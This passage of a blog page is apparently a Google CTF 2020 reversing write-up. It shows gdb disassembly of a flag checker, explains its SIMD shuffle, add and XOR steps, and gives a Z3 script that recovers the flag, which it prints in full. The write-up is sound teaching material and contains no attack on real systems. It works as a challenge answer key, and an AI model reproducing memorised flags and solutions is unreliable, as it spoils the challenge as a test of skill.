+   0x000000000000109a &lt;+26&gt;:    lea    rbp,[rsp+0x10]
+   0x000000000000109f &lt;+31&gt;:    mov    rsi,r12
+   0x00000000000010a2 &lt;+34&gt;:    lea    rdi,[rip+0xf62]        # 0x200b
+   0x00000000000010a9 &lt;+41&gt;:    call   0x1060 &lt;__isoc99_scanf@plt&gt;
+   0x00000000000010ae &lt;+46&gt;:    movdqa xmm0,XMMWORD PTR [rsp]
+   0x00000000000010b3 &lt;+51&gt;:    mov    rsi,rbp
+   0x00000000000010b6 &lt;+54&gt;:    mov    rdi,r12
+   0x00000000000010b9 &lt;+57&gt;:    mov    edx,0x10
+   0x00000000000010be &lt;+62&gt;:    pshufb xmm0,XMMWORD PTR [rip+0x2fa9]        # 0x4070 &lt;SHUFFLE&gt;
+   0x00000000000010c7 &lt;+71&gt;:    paddd  xmm0,XMMWORD PTR [rip+0x2f91]        # 0x4060 &lt;ADD32&gt;
+   0x00000000000010cf &lt;+79&gt;:    pxor   xmm0,XMMWORD PTR [rip+0x2f79]        # 0x4050 &lt;XOR&gt;
+   0x00000000000010d7 &lt;+87&gt;:    movaps XMMWORD PTR [rsp+0x10],xmm0
+   0x00000000000010dc &lt;+92&gt;:    call   0x1030 &lt;strncmp@plt&gt;
+   0x00000000000010e1 &lt;+97&gt;:    test   eax,eax
+   0x00000000000010e3 &lt;+99&gt;:    jne    0x1100 &lt;main+128&gt;
+   0x00000000000010e5 &lt;+101&gt;:   mov    rsi,QWORD PTR [rip+0x2f94]        # 0x4080 &lt;EXPECTED_PREFIX&gt;
+   0x00000000000010ec &lt;+108&gt;:   mov    edx,0x4
+   0x00000000000010f1 &lt;+113&gt;:   mov    rdi,rbp
+   0x00000000000010f4 &lt;+116&gt;:   call   0x1030 &lt;strncmp@plt&gt;
+   0x00000000000010f9 &lt;+121&gt;:   mov    r12d,eax
+   0x00000000000010fc &lt;+124&gt;:   test   eax,eax
+   0x00000000000010fe &lt;+126&gt;:   je     0x111d &lt;main+157&gt;
+   0x0000000000001100 &lt;+128&gt;:   lea    rdi,[rip+0xf11]        # 0x2018
+   0x0000000000001107 &lt;+135&gt;:   mov    r12d,0x1
+   0x000000000000110d &lt;+141&gt;:   call   0x1040 &lt;puts@plt&gt;
+   0x0000000000001112 &lt;+146&gt;:   add    rsp,0x28
+   0x0000000000001116 &lt;+150&gt;:   mov    eax,r12d
+   0x0000000000001119 &lt;+153&gt;:   pop    rbp
+   0x000000000000111a &lt;+154&gt;:   pop    r12
+   0x000000000000111c &lt;+156&gt;:   ret
+   0x000000000000111d &lt;+157&gt;:   lea    rdi,[rip+0xeec]        # 0x2010
+   0x0000000000001124 &lt;+164&gt;:   call   0x1040 &lt;puts@plt&gt;
+   0x0000000000001129 &lt;+169&gt;:   jmp    0x1112 &lt;main+146&gt;
+End of assembler dump.
+</code></pre>
+<p>The key part is:</p>
+<pre><code>   0x00000000000010be &lt;+62&gt;:    pshufb xmm0,XMMWORD PTR [rip+0x2fa9]        # 0x4070 &lt;SHUFFLE&gt;
+   0x00000000000010c7 &lt;+71&gt;:    paddd  xmm0,XMMWORD PTR [rip+0x2f91]        # 0x4060 &lt;ADD32&gt;
+   0x00000000000010cf &lt;+79&gt;:    pxor   xmm0,XMMWORD PTR [rip+0x2f79]        # 0x4050 &lt;XOR&gt;
+   0x00000000000010d7 &lt;+87&gt;:    movaps XMMWORD PTR [rsp+0x10],xmm0
+   0x00000000000010dc &lt;+92&gt;:    call   0x1030 &lt;strncmp@plt&gt;
+</code></pre>
+<p>The input (flag) is placed in a 128-bit register <code>xmm0</code> and 3 128-bit operations are performed:</p>
+<ol>
+<li>Shuffle register based on key in 0x4070 (not randomly)</li>
+<li>Add register and value in 0x4060 as 4 32-bit uints (carry bits don't propaagate between the 4 additions)</li>
+<li>XOR with value in 0x4050</li>
+</ol>
+<p>The result should equal the original input flag (<code>strncmp</code>).</p>
+<h2 id="solution-1" tabindex="-1">Solution <a class="header-anchor" href="#solution-1">#</a></h2>
+<p>The XOR, ADD32, SHUFFLE keys can be extracted easily. However, shuffle was a bit confusing, so I just experimented to see how input was transformed:</p>
+<pre><code># Set breakpoint just after shuffle
+&gt; break *main+71
+&gt; run
+Flag: abcdefghijklmnopqr
+&gt; p (char[]) $xmm0
+$1 = &quot;cghbfljod\000eikmna&quot;
+</code></pre>
+<p>Next to find an input which remains the same at the end of the 3 transformations I used the SAT solver Z3 (<code>pip install z3-solver</code>).</p>
+<pre class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">import</span> struct
+<span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span>
+
+shuffle_mask <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span>
+
+s <span class="token operator">=</span> Solver<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+original <span class="token operator">=</span> Ints<span class="token punctuation">(</span><span class="token string">'_a _b _c _d _e _f _g _h _i _j _k _l _m _n _o'</span><span class="token punctuation">)</span>
+
+shuffled <span class="token operator">=</span> <span class="token punctuation">[</span>original<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">if</span> i <span class="token operator">!=</span> <span class="token number">15</span> <span class="token keyword">else</span> IntVal<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> shuffle_mask<span class="token punctuation">]</span>
+
+ADD <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xdeadbeef</span><span class="token punctuation">,</span> <span class="token number">0xfee1dead</span><span class="token punctuation">,</span> <span class="token number">0x13371337</span><span class="token punctuation">,</span> <span class="token number">0x67637466</span><span class="token punctuation">]</span>
+
+<span class="token comment"># XOR = [0x49b45876, 0x385f1a8d, 0x34f823d4, 0xaaf986eb]</span>
+XOR <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0xb4</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x8d</span><span class="token punctuation">,</span> <span class="token number">0x1a</span><span class="token punctuation">,</span> <span class="token number">0x5f</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0xd4</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0xeb</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0xf9</span><span class="token punctuation">,</span> <span class="token number">0xaa</span><span class="token punctuation">]</span>
+XOR <span class="token operator">=</span> <span class="token punctuation">[</span>BitVecVal<span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> a <span class="token keyword">in</span> XOR<span class="token punctuation">]</span>
+
+<span class="token comment"># Add in 4 32-bit ints</span>
+mega_add <span class="token operator">=</span> <span class="token punctuation">[</span>
+    additive <span class="token operator">+</span> <span class="token builtin">sum</span><span class="token punctuation">(</span>
+        x <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">0</span> <span class="token keyword">else</span> x
+        <span class="token keyword">for</span> j<span class="token punctuation">,</span> x <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>shuffled<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token operator">*</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token punctuation">)</span>
+    <span class="token keyword">for</span> i<span class="token punctuation">,</span> additive <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>ADD<span class="token punctuation">)</span>
+<span class="token punctuation">]</span>
+<span class="token comment"># Split result back into 16 bytes</span>
+added <span class="token operator">=</span> <span class="token punctuation">[</span>
+    Int2BV<span class="token punctuation">(</span>m <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">if</span> i <span class="token operator">></span> <span class="token number">0</span> <span class="token keyword">else</span> Int2BV<span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> m <span class="token keyword">in</span> mega_add
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
+<span class="token punctuation">]</span>
+
+xored <span class="token operator">=</span> <span class="token punctuation">[</span>added_var <span class="token operator">^</span> xor <span class="token keyword">for</span> added_var<span class="token punctuation">,</span> xor <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>added<span class="token punctuation">,</span> XOR<span class="token punctuation">)</span><span class="token punctuation">]</span>
+
+outputs <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>xored<span class="token punctuation">)</span>
+
+<span class="token keyword">for</span> i<span class="token punctuation">,</span> cribbed <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span><span class="token string">'CTF{*********!}'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> cribbed <span class="token operator">!=</span> <span class="token string">'*'</span><span class="token punctuation">:</span>
+        s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>original<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>cribbed<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>outputs<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>cribbed<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>outputs<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> Int2BV<span class="token punctuation">(</span>original<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>original<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">33</span><span class="token punctuation">)</span>  <span class="token comment"># Guess alphabet range for flag</span>
+        s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>original<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">126</span><span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"LETS GO"</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+model <span class="token operator">=</span> s<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>model<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">hex</span><span class="token punctuation">(</span>model<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>as_long<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> original<span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">hex</span><span class="token punctuation">(</span>model<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>as_long<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> shuffled<span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">hex</span><span class="token punctuation">(</span>model<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>as_long<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> added<span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">hex</span><span class="token punctuation">(</span>model<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>as_long<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> xored<span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">hex</span><span class="token punctuation">(</span>model<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>as_long<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> outputs<span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>model<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>as_long<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> outputs<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+<p>Which after 1 minute prints out the flag <code>CTF{S1MDf0rM3!}</code>.</p>
+
+<ul class="links-nextprev"><li>Previous: <a href="/defconsm-car-hacking/">DEFCON:SM Car Hacking</a></li><li>Next: <a href="/defcon29-rtv-ctf/">DEFCON29 RTV CTF</a></li>
+</ul>
+
+		</main>
+
+		<footer></footer>
+
+		<!-- Current page: /google-ctf-2020-writeup/ -->
+	</body>
+</html>
